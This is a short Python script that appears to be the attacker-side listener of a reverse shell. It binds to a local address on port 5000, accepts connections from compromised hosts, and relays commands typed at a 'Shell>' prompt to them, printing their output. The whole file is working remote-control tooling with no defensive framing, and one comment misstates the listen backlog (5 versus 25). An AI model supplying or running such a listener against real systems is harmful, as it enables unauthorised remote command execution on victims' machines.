import socket
import subprocess

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("192.168.86.11", 5000))
    s.listen(25)  # Listen for up to 5 connections, adjust as needed

    print('[+] Listening for incoming TCP connections on port 5000')

    while True:
        conn, addr = s.accept()
        print('[+] We got a connection from: ', addr)
        
        handle_client(conn)

def handle_client(conn):
    while True:
        command = input("Shell> ")

        if 'terminate' in command:
            conn.send('terminate'.encode('utf-8'))
            conn.close()
            break
        else:
            conn.send(command.encode("utf-8"))
            print(conn.recv(1024).decode("utf-8"))

def main():
    start_server()

if __name__ == "__main__":
    main()
